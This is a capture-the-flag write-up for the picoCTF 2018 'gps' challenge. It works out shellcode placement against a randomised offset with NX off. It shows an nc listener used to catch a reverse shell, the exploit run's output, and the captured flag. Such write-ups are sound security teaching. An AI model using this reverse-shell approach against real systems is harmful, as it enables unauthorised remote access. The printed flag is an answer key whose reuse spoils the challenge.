# gps - Points: 550 - (Solves: 131)

You got really lost in the wilderness, with nothing but your trusty [gps][1].
Can you find your way back to a shell and get the flag?
Connect with nc 2018shell2.picoctf.com 29035
([Source][2]).

[1]: https://2018shell2.picoctf.com/static/5c375c95f714f6f4b59917f69e5927c5/gps
[2]: https://2018shell2.picoctf.com/static/5c375c95f714f6f4b59917f69e5927c5/gps.c

## Hints

Can you make your shellcode randomization-resistant?

---

NOTE:NX is off.

In the source file `gps.c`::

```c
#define GPS_ACCURACY 1337
int offset = rand() % GPS_ACCURACY - (GPS_ACCURACY / 2);
```

So `-668 <= offset <= 668`.

Also, offset between `stk` @ query_position and `buffer` @ main
when calculating in GDB is

    &buffer - &stk = 0x7fffffffd290 - 0x7fffffffd25b = 0x35     (1)


In the other hand, we have::

    void *ret = &stk + offset;                                  (2)

Hence, substitute `&stk = ret - offset` to (1)::

    => &buffer - (ret - offset) = 0x35
    => offset - 0x35 = ret - &buffer
    => -721 <= ret - &buffer <= 615
    => &buffer - 721 <= ret <= &buffer + 615

Note that buffer size is `0x1000 = 4096`:

This means that we have to place the shellcode after::

    >= buffer + 1336

NOTE:
  We cannot use normal execve /bin/sh shell cause the stdout is not open to
  /bin/sh. Pay attention to command `setbuf(stdout, NULL);`, this command
  causes the /bin/sh cannot receive normal stdout and quit quietly.

  So we now use the reversed shell instead.

## Result

In picoCTF shell server
```sh
nc -l -p 2893
```

In attack server:
```sh
% py solve.py REMOTE
[+] Opening connection to 2018shell2.picoctf.com on port 29035: Done
[*] Sending position: 0x7ffdaf9196ed
[+] Here are your shell!
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```

In picoCTF shell server
```sh
$ nc -l -p 2893
flag.txt
gps
gps.c
xinet_startup.sh
gps_3
uid=1229(gps_3) gid=1230(gps_3) groups=1230(gps_3)
cat flag.txt
picoCTF{s4v3_y0urs3lf_w1th_a_sl3d_0f_n0ps_gvzbnemc}
```
